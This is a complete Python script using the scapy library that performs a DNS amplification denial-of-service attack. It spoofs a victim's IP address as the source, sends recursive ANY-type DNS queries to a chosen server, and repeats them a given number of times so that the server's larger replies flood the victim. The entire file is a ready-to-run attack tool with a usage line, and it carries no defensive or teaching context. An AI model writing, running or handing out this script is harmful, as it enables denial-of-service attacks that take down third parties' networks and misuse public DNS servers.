#!/usr/bin/env python3

from scapy.all import *
import sys

# python3 dns_amp_attack.py <victim_addr> <dns_server_addr> <domain> <number_of_packets>

victim_addr = sys.argv[1]
dns_server_addr = sys.argv[2]
domain = sys.argv[3]
number_of_packets = sys.argv[4]

ip = IP(src=victim_addr, dst=dns_server_addr)
udp = UDP(dport=53)
dns = DNS(rd=1, qdcount=1, qd=DNSQR(qname=domain, qtype=255))

request = (ip/udp/dns)
send(request, count=int(number_of_packets))
